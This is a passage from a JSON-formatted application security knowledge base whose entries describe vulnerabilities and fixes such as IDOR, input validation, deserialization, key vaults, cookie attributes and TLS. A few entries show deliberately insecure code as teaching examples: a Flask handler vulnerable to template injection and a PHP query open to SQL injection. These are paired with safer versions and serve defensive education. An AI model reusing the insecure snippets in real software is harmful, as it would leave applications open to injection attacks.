"Solution": "User supplied input should never be used directly into a template that uses a templating engine. The following example is a small python flask function that renders user supplied input  as part of the template. This allows a malicious attacker to even execute arbitrary commands when.```   @app.errorhandler(404)   def page_not_found(e):       template = \"\"\"   <html>   <p>{0}</p>   </html>  \"\"\".format(request.url)       return render_template_string(template), 404 ```The prefered way to add the user supplied input to this template would be: ```   @app.errorhandler(404)   def page_not_found(e):     input = request.url     return render_template(\"errorpage.html\", input = input), 404 ```    Wheras the content of the errorpage.html would look like```   <html>       <p>{{input}}</p>   </html> ``` "
},
{
"kbId": 268,
"title": "Insecure direct object references",
"Description": "Applications frequently use the actual name or key of an object when generating web pages.  Applications don\u2019t always verify the user is authorized for the target object.  This results in an insecure direct object reference flaw. Testers can easily manipulate parameter  values to detect such flaws and code analysis quickly shows whether authorization is properly verified.The most classic example: The application uses unverified data in a SQL call that is accessing account information:String query = \"SELECT * FROM accts WHERE account = ?\"; PreparedStatement pstmt = connection.prepareStatement(query , ... ); pstmt.setString( 1, request.getParameter(\"acct\")); ResultSet results = pstmt.executeQuery();The attacker simply modifies the \u2018acct\u2019 parameter in their browser to send whatever  account number they want. If not verified, the attacker can access any user\u2019s account, instead of  only the intended customer\u2019s account.http://example.com/app/accountInfo?acct=notmyacct ",
"Solution": "Preventing insecure direct object references requires selecting an approach  for protecting each user accessible object (e.g., object number, filename):Use per user or session indirect object references. This prevents attackers from directly  targeting unauthorized resources. For example, instead of using the resource\u2019s database key,  a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to  indicate which value the user selected. The application has to map the peruser indirect reference  back to the actual database key on the server.Check access. Each use of a direct object reference from an untrusted source must include an access control  check to ensure the user is authorized for the requested object. "
},
{
"kbId": 269,
"title": "Type checking and length checking",
"Description": "Type checking, length checking and whitelisting is an essential in defense in depth strategie to make your application more resiliant against input injection attacks.Example:     ```     SELECT * FROM pages WHERE id=mysql_real_escape_string($_GET[''id''])     ```      This PHP example did effectively not mitigate the SQL injection. This was due to the fact that it only escaped string based SQL injection. Now, if this application also had additional checks to validate if the value of  the $_GET[''id''] parameter was indeed as expected an integer and rejected if this condition was false,  the attack would effectively been mitigated.  ",
"Solution": "All the user supplied input that works outside of the intended opteration of the application should be rejected by the application.Syntax and Semantic Validity An application should check that data is both syntactically and semantically  valid (in that order) before using it in any way (including displaying it back to the user). Syntax validity, means that the data is in the form that is expected. For example, an application may allow a user to select a fourdigit \u201caccount ID\u201d to perform some kind of operation.  The application should assume the user is entering a SQL injection payload, and should  check that the data entered by the user is exactly four digits in length, and consists only of numbers  (in addition to utilizing proper query parameterization).Semantic validity, includes only accepting input that is within an acceptable range for the given application functionality and context. For example, a start date must be before an end date when choosing date ranges."
},
{
"kbId": 270,
"title": "SMTP IMAP injection",
"Description": "This threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.The IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.An IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the frontend web servers. Therefore, mail server results may be more vulnerable to attacks by end users. ",
"Solution": "Limit the available IMAP/SMTP commands to the ones that are really needed. Also make sure you make it not publicly available when there is no need for this."
},
{
"kbId": 271,
"title": "Insecure object deserialization",
"Description": "Serialization is the process of turning some object into a data format that can be restored later.  People often serialize objects in order to save them to storage, or to send as part of communications.Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.However, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process.Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denialofservice, access control, and remote code execution (RCE) attacks.  ",
"Solution": "Verify that serialized objects use integrity checks or are encrypted to prevent hostile object creation or data tampering.A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a  pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed  towards malicious ends.Many applications rely on a datatransfer object pattern that involves creating a separate domain of  objects for the explicit purpose data transfer. Of course, it''s still possible that the application  will make security mistakes after a pure data object is parsed.If the application knows before deserialization which messages will need to be processed,  they could sign them as part of the serialization process. The application could then to  choose not to deserialize any message which didn''t have an authenticated signature. "
},
{
"kbId": 272,
"title": "Software security development lifecycle",
"Description": "In software engineering, a software development process is the process of dividing software development work into distinct phases to improve design, product management, and project management.  It is also known as a software development life cycle. The methodology may include the  predefinition of specific deliverables and artifacts that are created and completed by a  project team to develop or maintain an applicationIn this software security development lifecycle we can also integrate security test automation and other quality pilars for security. ",
"Solution": "The secure software development lifecycle ideally consists out of 5 different stages namely:* Training and awareness * Security requirements * Test automation (unit testing, sonarqube, e2e testing, etc) * Security test automation (SAST, DAST, IAST, RASP, ETC) * Secure code review, penetration testThere are a lot of ways to achieve a good (S)SDLC, the most important thing to keep into consideration is that you need to have a scalable solution that works over different CI envorinments. Also keep in mind that your CI/CD pipeline is a production environment that delivers production environments. So your CI/CD pipelines should be hardened as well as any other  application.  Keep into consideration things like Monitoring on your pipeline  Secret management  Hardening of containers  Hardening of your CI environment  etc "
},
{
"kbId": 273,
"title": "Functional security constraints",
"Description": "Functional security constraints help your software developers determine the level of grants/authorizations the users have over the application.  ",
"Solution": "Verify that all user stories and features contain functional security constraints, such as  \"As a user, I should be able to view and edit my profile. I should not be able to view or edit anyone else''s profile\" "
},
{
"kbId": 274,
"title": "Attribute based authorization",
"Description": "Access Control (or Authorization) is the process of granting or denying specific requests from a user,  program, or process. Access control also involves the act of granting and revoking those privileges.It should be noted that authorization (verifying access to specific features or resources) is not equivalent to authentication (verifying identity).   ",
"Solution": "Attribute Based Access Control (ABAC) will grant or deny user requests based on arbitrary  attributes of the user and arbitrary attributes of the object, and environment conditions  that may be globally recognized and more relevant to the policies at hand. Once you have chosen a specific access control design pattern, it is often difficult and time consuming to reengineer access control in your application with a new pattern. Access Control is one of the main areas of application security design that must be thoroughly designed up front,  especially when addressing requirements like multitenancy and horizontal (data dependent) access control.  Ideally we want to move from here: ``` if (user.hasRole(\"ADMIN\")) || (user.hasRole(\"MANAGER\")) {    deleteAccount(); } ```To here:``` if (user.hasAccess(\"DELETE_ACCOUNT\")) {    deleteAccount(); } ```This is becuase the latter is more manageble over time.For more information please refer to the OWASP top 10 pro active controls.https://www.owasp.org/index.php/OWASP_Proactive_ControlsOWASP pro active controls chapter C7 \"Enforce Access Controls\""
},
{
"kbId": 275,
"title": "Key management and key lifecycle by NIST",
"Description": "This knowledgebase item refers to the NIST standard for key managment and key lifecycle.This Recommendation provides cryptographic key management guidance. It consists of three parts. Part 1 provides general guidance and best practices for the management of cryptographic keying material. Part 2 provides guidance on policy and security planning requirements for U.S. government agencies. Finally, Part 3 provides guidance when using the cryptographic features of current systems.  ",
"Solution": "Please refer to the following documentation for more indepth information:https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.80057pt1r4.pdf "
},
{
"kbId": 276,
"title": "Key vault",
"Description": "Keys should remain in a protected key vault at all times.  In particular, ensure that there is a gap between the threat vectors  that have direct access to the data and the threat vectors that have direct access to the keys.  This implies that keys should not be stored on the application or web server  (assuming that application attackers are part of the relevant threat model).A key vault helps secure, store and tightly control access to tokens, passwords, certificates and, encryption keys for protecting secrets and other sensitive data.  Imagine the use of a keyvault in the following scenario''s* Running a docker container and provisioning it with secrets over CLI * Checking in API keys in your source repositories * Encrypting sensitive data at restVault provides encryption as a service with centralized key management to simplify encrypting data  in transit and at rest across clouds and datacenters.a Vault can be used to encrypt/decrypt data that is stored elsewhere. The primary use of this is to allow applications to encrypt their data while still storing it in the primary data store.The benefit of this is that developers do not need to worry about how to properly encrypt data. The responsibility of encryption is on Vault and the security team managing it, and developers just encrypt/decrypt data as needed. ",
"Solution": "centrally store, access, and distribute secrets like API keys, AWS IAM/STS credentials, SQL/NoSQL databases, X.509 certificates,  SSH credentials, etc by means of a key vault.When selecting a key vault that is fit for your needs make sure it has Cryptographic Compliance towards the FIPS standards. "
},
{
"kbId": 277,
"title": "Secrets shared with the client",
"Description": "symmetric keys, passwords, or API secrets that are shared with the client should not be used for functions that are classified critical.Whenever a client is sucessfully targeted by a malicious attacker the integrety of these keys is no longer guaranteed.  ",
"Solution": "Verify that symmetric keys, passwords, or API secrets generated by or shared with clients are used only in protecting low risk secrets,  such as encrypting local storage, or temporary ephemeral uses such as parameter obfuscation. Sharing secrets with clients is cleartext equivalent and architecturally should be treated as such. "
},
{
"kbId": 278,
"title": "Data protection levels",
"Description": "The CIA triad of confidentiality, integrity, and availability is at the heart of information security.Confidentiality In information security, confidentiality \"is the property, that information is not made available or disclosed to unauthorized individuals, entities, or processes.\"  While similar to \"privacy,\" the two words aren''t interchangeable. Rather, confidentiality  is a component of privacy that implements to protect our data from unauthorized viewers. Examples of confidentiality of electronic data being compromised include laptop theft,  password theft, or sensitive emails being sent to the incorrect individuals.Integrity In information security, data integrity means maintaining and assuring the accuracy and completeness of data over its entire lifecycle. This means that data cannot be modified in an unauthorized or undetected manner. This is not the same thing as referential integrity in databases, although it can be viewed as a special case of consistency as understood in the classic ACID model of transaction processing. Information security systems typically provide message integrity along side to confidentiality.Availability For any information system to serve its purpose, the information must be available when it is needed. This means the computing systems used to store and process the information,  the security controls used to protect it, and the communication channels used to access it must be functioning correctly. High availability systems aim to remain available at all times, preventing service disruptions due to power outages, hardware failures,  and system upgrades. Ensuring availability also involves preventing denialofservice attacks,  such as a flood of incoming messages to the target system, essentially forcing it to shut down.  ",
"Solution": "Based on CIA determine a protection level and define countermessures that belong to that specific  protection level such as but not limited to. encryption requirements  integrity requirements   retention  privacy and other confidentiality requirements, and that these are applied in the architecture. "
},
{
"kbId": 279,
"title": "Source control systems in place",
"Description": "A component of software configuration management, version control, also known as revision control or source control, is the management of changes to documents, computer programs, large web sites, and other collections of information. Changes are usually identified by a number or letter code, termed the \"revision number\", \"revision level\", or simply \"revision\". For example, an initial set of files is \"revision 1\". When the first change is made, the resulting set is \"revision 2\", and so on. Each revision is associated with a timestamp and the person making the change. Revisions can be compared, restored, and with some types of files, merged.Benefits of source control for security are amongst others,  Restoring Previous Versions  Understanding What Happened  Backup  Easy to Review code  Fundemental for CI/CD integrations ",
"Solution": "Verify that a source code control system is in use, with procedures to ensure that checkins are accompanied by issues or change tickets.  The source code control system should have access control and  identifiable users to allow traceability of any changes. "
},
{
"kbId": 280,
"title": "Continuous security testing",
"Description": "We want to test our applications and infrastructure for out of date and insecure components and services that are running periodically. We can configure our CI environment in such a way that we have jobs running that do automated continuous (hourly, daily, weekly, monthly) security scanning on our infrastructure and applications.  ",
"Solution": "Integrate security tooling into your CI/CD pipelines that do continuous security scanning against your applications and infrastructure such as but not limited to the following tools,* Nessus * OpenVas * Nmap * Nikto * OWASP Zap (passive scans)These tools should than run periodically to scan your system for known vulnerabilities and report high/critical findings to your engineers so they can take appropriate actions. "
},
{
"kbId": 281,
"title": "Security test automation",
"Description": "Security tools can be easiliy integrated into CI/CD pipelines. Generally the recommended way is to containerize your tooling to have a CI environment agnostic approach so you can build and configure them once and than run them everywhere you need. Especially with autonomous  self steering developer teams this is a really important development.There are a lot of security tools on the market both free and premium. It is for you to decide which tools cover your technology stacks most optimal.There are different category tooling such as but not limited to, DAST tools   Web Application Vulnerability Scanners are automated tools that scan   web applications, normally from the outside, to look for security   vulnerabilities such as Crosssite scripting, SQL Injection,    Command Injection, Path Traversal and insecure server configuration.    This category of tools is frequently referred to as Dynamic Application    ecurity Testing (DAST) Tools.   SAST tools   Source code analysis tools, also referred to as Static    Application Security Testing (SAST) Tools, are designed to    analyze source code and/or compiled versions of code to help    find security flaws.   Dependency checker tools    up to 90 percent of an application typically consists of thirdparty components.    A depdendenct checker builds up the applications dependency tree and correlates    all the third party components to known vulnerabilities to see if    by using these libraries, you are introducing vulnerable components in your     application. Some Source code repositories provide dependency checking out    of the box these days. ",
"Solution": "Examples for SAST tooling are found here, allong with more in depth information.    https://www.owasp.org/index.php/Source_Code_Analysis_ToolsExamples for DAST tooling are found here,    https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools Examples for tools that can scan your containers for vulnerbilities are,    https://coreos.com/clair/docs/latest/     https://anchore.com/Examples for Dependency checkers are found here,     https://www.owasp.org/index.php/OWASP_Dependency_Check "
},
{
"kbId": 282,
"title": "Referrer policy header",
"Description": " Requests made from a document, and for navigations away from that document are associated with a Referer header. While the header can be suppressed for links with the noreferrer link type, authors might wish to control the Referer header more directly for a number of reasons, Privacy A social networking site has a profile page for each of its users,  and users add hyperlinks from their profile page to their favorite bands.  The social networking site might not wish to leak the user\u2019s profile URL  to the band web sites when other users follow those hyperlinks  (because the profile URLs might reveal the identity of the owner of the profile).Some social networking sites, however, might wish to inform the band web sites that the links originated from the social networking site but not reveal which specific user\u2019s profile contained the links. Security A web application uses HTTPS and a URLbased session identifier. The web application might wish to link to HTTPS resources on other web sites without leaking the user\u2019s session  identifier in the URL.Alternatively, a web application may use URLs which themselves grant some capability.  Controlling the referrer can help prevent these capability URLs from leaking via  referrer headers.Note that there are other ways for capability URLs to leak, and controlling  the referrer is not enough to control all those potential leaks. Trackback A blog hosted over HTTPS might wish to link to a blog hosted over HTTP and  receive trackback links. ",
"Solution": "For more information about the policy and how it should be implemented please visit the following link,https://www.w3.org/TR/referrerpolicy/referrerpolicies "
},
{
"kbId": 283,
"title": "Insecure application defaults",
"Description": "When default sample applications, default users, etc are not removed from your production environment you are increasing an attackers potentiall attack surface significantly. ",
"Solution": "Verify that all unneeded features, documentation, samples,  configurations are removed, such as sample applications,  platform documentation, and default or example users. "
},
{
"kbId": 284,
"title": "Infrastructure as code",
"Description": "Infrastructure as code (IaC) is the process of managing and provisioning  applications and infrastrucutre through machinereadable definition files,  rather than physical hardware configuration or interactive configuration tools ",
"Solution": "Verify that the application build and deployment processes are performed in a secure and repeatable way, such as CI / CD automation, automated  configuration management, and automated deployment scripts.By doing so your infrastructure and application deployment also becomes immutable and is easier to patch and maintain. Also, having your provisioning of the application/infrastructure as code also means it has versioning and other important benefits from having a versioning control system in place.Other great benifits are, Speed and simplicity   IaC allows you to spin up an entire infrastructure architecture by running a script.  Configuration consistency   Standard operating procedures can help maintain some consistency in    the infrastructure deployment process  Quick rollback   When a mistake or vulnerable peace of code has been pushed to a production environment   with IaC it is easy to roll back to a stable/secure version. "
},
{
"kbId": 285,
"title": "GraphQL security",
"Description": "GraphQL is an opensource data query and manipulation language for APIs,  and a runtime for fulfilling queries with existing data. GraphQL was  developed internally by Facebook in 2012 before being publicly released i n 2015. On 7 November 2018, the GraphQL project was moved from Facebook  to the newlyestablished GraphQL foundation, hosted by the nonprofit Linux Foundation. ",
"Solution": "Verify that GraphQL or other data layer authorization logic is be  implemented at the business logic layer instead of the GraphQL layer. "
},
{
"kbId": 286,
"title": "JSON validation schema",
"Description": "JSON Schema is a vocabulary that allows you to annotate and validate JSON documents.When adding schema''s to your or JSON files you have better control over what type of userinput can be supplied in your application.  This dramatically decreases an attacker\u2019s vector when implemented the right way.  Nonetheless, you should always apply your own input validation and rejection as an extra layer of defense. This approach is also desirable since you also  want to do countering and logging on the user\u2019s requests and input. ",
"Solution": "Verify that JSON schema validation takes place to ensure a properly formed JSON request, followed by validation of each input field before any  processing of that data takes place. "
},
{
"kbId": 288,
"title": "Serve files whitelist.",
"Description": "Configiring the web server to only serve files with an expected file extension helps prevent information leakage whenever developers forget to remove backup files or zipped versions of the web application from the webserver.  ",
"Solution": "Verify that the web tier is configured to serve only files with specific file extensions to prevent unintentional information and source code leakage. For example, backup files (e.g. .bak), temporary working files (e.g. .swp), compressed files (.zip, .tar.gz, etc) and other extensions commonly used by editors should be blocked unless required. "
},
{
"kbId": 289,
"title": "User supplied scriptable or expression template language content",
"Description": "usersupplied scriptable or expression template language content, such as Markdown,  CSS or XSL stylesheets, BBCode, or similar are designed to give users the option to add a lot of rich styling to the application. However whenever these templates  do not filter for harmfull attacks, these templates can be used to leverage XSS attacks.  ",
"Solution": "Verify that the application sanitizes, disables, or sandboxes  usersupplied scriptable or expression template language content, such as Markdown,  CSS or XSL stylesheets, BBCode, or similar.How this is most effectively done depends on the framework and library you are choosing to incorperate. It is advised to investigate how to put up constraints for translating these template syntaxes to HTML tags and what their security implications are.  "
},
{
"kbId": 290,
"title": "Replay attacks",
"Description": " A replay attack (also known as playback attack) is a form of attack in which a valid data transmission is maliciously or fraudulently repeated or delayed.  This is carried out either by the originator or by an adversary who intercepts the data and retransmits it. This is one of the lower tier versions of a \"Maninthemiddle attack\". ",
"Solution": " Replay attacks can be prevented by tagging each encrypted component with a session ID and a component number. Using this combination of solutions does not use anything that is interdependent on one another.  Because there is no interdependency there are fewer vulnerabilities. This works because a unique,  random session id is created for each run of the program thus a previous run becomes more difficult to replicate.  In this case an attacker would be unable to perform the replay because on a new run the session ID would have changed "
},
{
"kbId": 291,
"title": "Same site attribute",
"Description": " SameSite prevents the browser from sending this cookie along with crosssite requests.  The main goal is mitigate the risk of crossorigin information leakage. It also provides some  protection against crosssite request forgery attacks.  ",
"Solution": " The strict value will prevent the cookie from being sent by the browser to the target site in all  crosssite browsing context, even when following a regular link. For example, for a GitHublike website this would mean that if a loggedin user follows a link to a private GitHub project posted on a corporate discussion forum or email, GitHub will not receive the session cookie and the user will not be able to access the project.A bank website however most likely doesn''t want to allow any transactional pages to be linked from external sites so the strict flag would be most appropriate here.The default lax value provides a reasonable balance between security and usability for websites that want to maintain user''s loggedin session after the user arrives from an external link. In the above GitHub scenario, the session cookie would be allowed when following a regular link from an external website while blocking it in  CSRFprone request methods (e.g. POST).As of November 2017 the SameSite attribute is implemented in Chrome, Firefox, and Opera.  Since version 12.1 Safari also supports this. Windows 7 with IE 11 lacks support as of December 2018,  see caniuse.com below. "
},
{
"kbId": 292,
"title": "Host prefix",
"Description": "Hardening of session cookies is possbile by using the ''__Host\" prefix. With this we can prevent the mis configuration of example the Path=/, Secure cookie and Domain attributes.   ",
"Solution": "The ''__Host\" prefix signals to the browser that both the Path=/ and Secure attributes are required,  and at the same time, that the Domain attribute may not be present."
},
{
"kbId": 293,
"title": "Race conditions",
"Description": " A race condition is a flaw that produces an unexpected result when the timing of actions impact other actions.  An example may be seen on a multithreaded application where actions are being performed on the same data.  Race conditions, by their very nature, are difficult to test for.Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of  other events. In a web application environment, where multiple requests can be processed at a given time,  developers may leave concurrency to be handled by the framework, server, or programming language. ",
"Solution": "One common solution to prevent race conditions is known as locking. This ensures that at any given time,  at most one thread can modify the database. Many databases provide functionality to lock a given row when a  thread is accessing it."
},
{
"kbId": 294,
"title": "Sub domain take over",
"Description": "Subdomain takeover is a process of registering a nonexisting domain name to gain control over another domain. The most common scenario of this process follows:Domain name (e.g., sub.example.com) uses a CNAME record to another domain (e.g., sub.example.com CNAME anotherdomain.com). At some point in time, anotherdomain.com expires and is available for registration by anyone. Since the CNAME record is not deleted from example.com DNS zone, anyone who registers anotherdomain.com has full control over sub.example.com until the DNS record is present.The implications of the subdomain takeover can be pretty significant. Using a subdomain takeover, attackers can send phishing emails from the legitimate domain, perform crosssite scripting (XSS), or damage the reputation of the brand which is associated with the domain. Source: https://0xpatrik.com/subdomaintakeoverbasics/ ",
"Solution": "As an end user of a service, going through your organization''s DNS records in a routine manner or while discontinuing or terminating a service will safely remove it''s DNS records.As a service provider, implementing stricter methods will prove (sub) domain ownership. "
},
{
"kbId": 295,
"title": "No password rotation policy",
"Description": " Some policies require users to change passwords periodically, often every 90 or 180 days.  The benefit of password expiration, however, is debatable. Systems that implement such  policies sometimes prevent users from picking a password too close to a previous selection.This policy can often backfire. Some users find it hard to devise \"good\" passwords that are  also easy to remember, so if people are required to choose many passwords because they have  to change them often, they end up using much weaker passwords; the policy also encourages  users to write passwords down. Also, if the policy prevents a user from repeating a recent password,  this requires that there is a database in existence of everyone''s recent passwords (or their hashes)  instead of having the old ones erased from memory. Finally, users may change their password repeatedly within a few minutes, and then change back to the one they really want to use, circumventing the  password change policy altogether. ",
"Solution": " Only force users to update their passwords when the password strength that is enforced by the application is no longer sufficient to withstand brute force attacks due to increase of computing power. "
},
{
"kbId": 296,
"title": "User notification on critical state changing operations",
"Description": " When a user is informed of critical operations than the user can determine if the notification is send by his own actions, or that the notifucation indicates  potential compromitation of his user account. ",
"Solution": "Verify that secure notifications are sent to users after updates to authentication details, such as credential resets, email or address changes, logging in from unknown or risky locations. Users must also be notified when password policies change or any other important updates that require action from the user to increase the security of his account.The use of push notifications  rather than SMS or email  is preferred, but in the  absence of push notifications, SMS or email is acceptable as long as no sensitive information is disclosed in the notification. "
},
{
"kbId": 297,
"title": "Stateless session tokens",
"Description": "JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and selfcontained way  for securely transmitting information between parties as a JSON object. This information can be verified and  trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.JSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This \"container\" is signed by the server in order to avoid that a client tamper it in order to change, for example, the identity or any characteristics (example: change the role from simple user to admin or change the client login).This token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing his \"identity card\" (container with all information about him) to server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used). ",
"Solution": "For more information about all the different implementation flaws for JWT please refer to:https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md "
},
{
"kbId": 298,
"title": "GUID v4",
"Description": " A universally unique identifier (UUID) is a 128bit number used to identify information in computer systems.  The term globally unique identifier (GUID) is also used, typically in software created by Microsoft. ",
"Solution": " A version 4 UUID is randomly generated. As in other UUIDs,  4 bits are used to indicate version 4, and 2 or 3 bits to indicate the variant  (102 or 1102 for variants 1 and 2 respectively). Thus, for variant 1 (that is, most UUIDs) a  random version4 UUID will have 6 predetermined variant and version bits, leaving 122 bits for  the randomly generated part, for a total of 2122, or 5.3\u00d71036 (5.3 undecillion) possible version4  variant1 UUIDs. There are half as many possible version4 variant2 UUIDs (legacy GUIDs) because  there is one less random bit available, 3 bits being consumed for the variant. "
},
{
"kbId": 299,
"title": "Exception handling",
"Description": " Exception handling is the process of responding to the occurrence, during computation,  of exceptions \u2013 anomalous or exceptional conditions requiring special processing  often disrupting the normal flow of program execution. It is provided by specialized  programming language constructs, computer hardware mechanisms like interrupts or operating  system IPC facilities like signals.In general, an exception breaks the normal flow of execution and executes a preregistered  exception handler. The details of how this is done depends on whether it is a hardware or  software exception and how the software exception is implemented. Some exceptions,  especially hardware ones, may be handled so gracefully that execution can resume where it was interrupted.Alternative approaches to exception handling in software are error checking,  which maintains normal program flow with later explicit checks for contingencies  reported using special return values or some auxiliary global variable  such as C''s errno or floating point status flags; or input validation to preemptively  filter exceptional cases. ",
"Solution": "By catching all different errors and exceptions your program will never be redirected in a  excecution flow that causes unexpected behaviour. This behaviour could include bypassing authorization  logic or other sanity checks that could be used to attack the target system."
},
{
"kbId": 300,
"title": "Back up data",
"Description": " In information technology, a backup, or data backup, or the process of backing up,  refers to the copying into an archive file of computer data that is already in  secondary storage so that it may be used to restore the original after a data loss event.  ",
"Solution": " Backups have two distinct purposes. The primary purpose is to recover data after its loss,  be it by data deletion or corruption. Data loss can be a common experience of computer users. The secondary purpose of backups is to recover data from an earlier time, according to a  userdefined data retention policy, typically configured within a backup application for how  long copies of data are required. Though backups represent a simple form of disaster recovery  and should be part of any disaster recovery plan, backups by themselves should not be considered a complete disaster recovery plan. One reason for this is that not all backup systems are able to reconstitute a computer system or other complex configuration such as a computer cluster,  active directory server, or database server by simply restoring data from a backup.In order to always poses over the latest state of your data it is recommended to do active syncing between the application server and the backup service. Also, try to not only write recovery policies  but also put them to the test regularly to verify the plans effective coverage in case if an incident. "
},
{
"kbId": 301,
"title": "Static code analysis",
"Description": " Static program analysis is the analysis of computer software that is performed without actually  executing programs, in contrast with dynamic analysis, which is analysis performed on programs  while they are executing.[1] In most cases the analysis is performed on some version of the source code,  and in the other cases, some form of the object code.The term is usually applied to the analysis performed by an automated tool, with human analysis being  called program understanding, program comprehension, or code review. Software inspections and software  walkthroughs are also used in the latter case. ",
"Solution": " There are a lot of different static code analysis tools on the market, it is important to determine what tools are able to scan your code base. After having selectecd the right SAST tool we can start writing  custom rules that help identify security risks such as time functions, unsafe file operations and network connections. "
},
{
"kbId": 302,
"title": "TLS",
"Description": "Transport Layer Security (TLS), and its nowdeprecated predecessor, Secure Sockets Layer (SSL), are cryptographic protocols designed to provide communications security over a computer network. Several versions of the protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications.[2]:3 When secured by TLS, connections between a client  (e.g., a web browser) and a server (e.g., wikipedia.org) should have one or more of the following properties:The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted.  The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared  secret that was negotiated at the start of the session. The server and client negotiate  the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted.  The negotiation of a shared secret is both secure (the negotiated secret is unavailable to eavesdroppers and cannot be  obtained, even by an attacker who places themselves in the middle of the connection) and reliable  (no attacker can modify the communications during the negotiation without being detected).The identity of the communicating parties can be authenticated using publickey cryptography.  This authentication can be made optional, but is generally required for at least one of the parties (typically the server).The connection is reliable because each message transmitted includes a message integrity check using  a message authentication code to prevent undetected loss or alteration of the data during transmission.In addition to the properties above, careful configuration of TLS can provide additional privacyrelated properties  such as forward secrecy, ensuring that any future disclosure of encryption keys cannot be used to decrypt any TLS communications recorded in the past ",
"Solution": " Always use TLS everywhere and apply the best security configuration."
},
{
"kbId": 303,
"title": "Code signing",
"Description": " Code signing is the process of digitally signing executables and scripts to confirm the software  author and guarantee that the code has not been altered or corrupted since it was signed.  The process employs the use of a cryptographic hash to validate authenticity and integrity.Code signing can provide several valuable features. The most common use of code signing is to  provide security when deploying; in some programming languages, it can also be used to help prevent  namespace conflicts. Almost every code signing implementation will provide some sort of digital  signature mechanism to verify the identity of the author or build system, and a checksum to verify  that the object has not been modified. It can also be used to provide versioning information about an object or to store other meta data about an objec ",
"Solution": " Sign your code and validate the signatures(checksums) of your code and third party components to confirm the integrity of the deployed components. "
},
{
"kbId": 304,
"title": "Secure random generators",
"Description": " A cryptographically secure pseudorandom number generator (CSPRNG) or cryptographic pseudorandom number generator (CPRNG) is a pseudorandom number generator (PRNG) with properties that make it  suitable for use in cryptography.Most  applications require random numbers, for example: key generation  nonces  salts  ",
"Solution": " Ideally, the generation of random numbers in CSPRNGs uses entropy obtained from a highquality source. Most of the development frameworks have excellent functions for generating true secure random values.To test the effective entropy of the generated token we can utilize the extensive analysis tool of \"Burpsuite community version\". more information in how to test your tokens effective entropy is found here:https://portswigger.net/burp/documentation/desktop/tools/sequencer "
},
{
"kbId": 999,
"title": "not available item",
"Description": "This item is currently not available. ",
"Solution": "This item is currently not available. "
},
{
"kbId": 1337,
"title": "Sensitive Information Exposure in URL",
"Description": "If the application logic transmits session IDs in the URL, their values could be leaked through the Referer header to thirdparty websites, logged by proxy servers, bookmarked in the browser, accidentally sent via emails or chats.  Whenever the session ID is disclosed in the URL there might be also the possibility to perform other attacks (like session fixation) that lead to session hijacking. ",
"Solution": "Session tokens should never be included in places other than the application Cookie header or other custom headers defined by the application."
},
{
"kbId": 1338,
"title": "Sensitive Information Exposure in client Side Storage",
"Description": "Clientside storage (also known as offline storage or web storage) is a functionality provided by browsers to allow applications to save information on the user''s computer and retrieve them when necessary.  Since this operations are performed by clientside scripting languages (notably Javascript), this information can be retrieved by thirdparty codes included in the webpages or by Crosssite scripting attacks (XSS) performed by attackers. Moreover, attackers with local privileges on the user''s machine are able to access these storages and possibly compromise the session of the users. ",
"Solution": "Sensitive data (like session tokens or Personal Identifiable Information) should never be stored in clientside storages.  This means to carefully verify that the application never saves at any time this kind of information in: * Local Storage * Session Storage * Web SQL * Cache Storage * Application Cache * IndexDB"
},
{
"kbId": 1339,
"title": "Session Token Generation After Login",
"Description": "The application should always generate a new session ID only after the user submits a set of valid credentials upon authentication. This is meant to prevent an attacker from performing Session Fixation attacks against other users. ",
"Solution": "Verify that session tokens are generated after a successfull authentication, not before. Please note also that these IDs should be unique and randomly generated. "
},
{
"kbId": 1341,
"title": "Secure Generation of Session Tokens",
"Description": "The application should always generate session IDs with a sufficient level of entropy. The goal to use randomly generated values for tokens is that of preventing session collision or session hijacking. If an attacker can guess an authenticated user''s session identifier, he can take over the user''s session. Moreover, an attacker that breaks the algorithm logic behind the session IDs generation might be able to arbitrary craft valid session tokens for any user.  ",
"Solution": "Verify that session tokens are created using approved cryptographic algorithms with more than 64 bits of entropy. As a Developer you should rely on functionalities provided by the framework. If not present, always refer to Secure Random Number functions provided by the programming language libraries. "
},
{
"kbId": 1342,
"title": "Ensure Session Validation in Credential Service Provider and Relying Parties.md",
"Description": "A Credential Service Provider (or Identity Provider) is an Identity Access Management entity that releases security tokens to users of specific services (called Relying Parties or Service Providers). An Identity Provider makes possible to authenticate the user to registered services without actually requiring them to login again for every application.When deploying a Credential Service Provider it is necessary to verify that the Credential Service Provider and Relying Parties handle the session management mechanisms in a secure way.  ",
